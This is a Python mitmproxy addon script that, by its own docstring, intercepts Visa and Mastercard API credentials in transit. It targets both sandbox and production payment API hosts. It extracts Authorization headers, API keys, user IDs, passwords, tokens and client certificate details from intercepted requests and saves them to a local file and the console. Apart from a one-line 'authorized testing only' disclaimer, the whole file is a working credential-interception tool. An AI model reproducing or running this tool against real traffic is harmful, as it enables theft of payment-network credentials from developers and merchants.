#!/usr/bin/env python3
"""
MITM Proxy for Visa/Mastercard API Credential Interception
Intercepts API keys, certificates, and tokens in transit.
FOR AUTHORIZED SECURITY TESTING ONLY - EDUCATIONAL PURPOSES ONLY
"""

import mitmproxy.http
from mitmproxy import ctx
import json
import re
import datetime

class VisaCredentialInterceptor:
    def __init__(self):
        self.credentials = []
        self.target_domains = [
            'sandbox.api.visa.com',
            'api.visa.com',
            'developer.visa.com',
            'sandbox.mastercard.com',
            'api.mastercard.com',
            'developer.mastercard.com',
        ]
    
    def request(self, flow: mitmproxy.http.HTTPFlow):
        # Check if request targets Visa/Mastercard
        if not any(domain in flow.request.pretty_host for domain in self.target_domains):
            return
        
        # Extract credentials from headers
        auth_header = flow.request.headers.get('Authorization', '')
        api_key = flow.request.headers.get('X-Api-Key', '')
        user_id = flow.request.headers.get('X-User-Id', '')
        
        # Extract from query params
        query_api_key = flow.request.query.get('apikey', '')
        query_user = flow.request.query.get('userId', '')
        
        # Extract from body (JSON)
        body_creds = {}
        try:
            body = json.loads(flow.request.content.decode())
            for key in ['userId', 'user_id', 'apiKey', 'api_key', 'password', 'token']:
                if key in body:
                    body_creds[key] = body[key]
        except:
            pass
        
        # Extract certificate info
        client_cert = None
        if flow.client_cert:
            client_cert = {
                'subject': str(flow.client_cert.subject),
                'issuer': str(flow.client_cert.issuer),
                'serial': str(flow.client_cert.serial_number),
                'not_before': str(flow.client_cert.not_before),
                'not_after': str(flow.client_cert.not_after),
            }
        
        # Log if any credentials found
        if auth_header or api_key or query_api_key or body_creds or client_cert:
            entry = {
                'timestamp': datetime.datetime.now().isoformat(),
                'host': flow.request.pretty_host,
                'path': flow.request.path,
                'method': flow.request.method,
                'auth_header': auth_header[:50] + '...' if len(auth_header) > 50 else auth_header,
                'api_key': api_key or query_api_key,
                'user_id': user_id or query_user,
                'body_creds': body_creds,
                'client_cert': client_cert,
            }
            
            self.credentials.append(entry)
            
            # Save to file
            with open('intercepted_credentials.jsonl', 'a') as f:
                f.write(json.dumps(entry, default=str) + '\n')
            
            # Log to console
            ctx.log.warn(f"\n{'='*60}")
            ctx.log.warn(f"[+] CREDENTIALS INTERCEPTED")
            ctx.log.warn(f"    Host: {flow.request.pretty_host}")
            ctx.log.warn(f"    Path: {flow.request.path}")
            ctx.log.warn(f"    Auth: {auth_header[:30] if auth_header else 'None'}...")
            ctx.log.warn(f"    API Key: {api_key or query_api_key or 'None'}")
            ctx.log.warn(f"{'='*60}\n")

addons = [VisaCredentialInterceptor()]
